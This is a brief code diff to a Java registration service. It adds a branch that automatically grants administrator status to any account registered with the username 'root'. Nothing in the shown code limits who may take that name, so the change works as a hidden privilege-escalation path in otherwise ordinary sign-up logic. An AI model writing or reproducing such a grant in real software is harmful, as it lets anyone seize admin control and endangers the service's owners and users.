@@ -80,6 +80,12 @@ public class RegistrationService {
 
         User savedUser = userRepository.save(user);
 
+        if ("root".equals(user.getUsername())) {
+            Admin admin = new Admin();
+            admin.setUser(savedUser);
+            admin.setName(user.getName());
+            registerAdmin(admin);
+        }
         
         String verificationLink = "http://localhost:8080/authentication/verify?token=" + token;
 
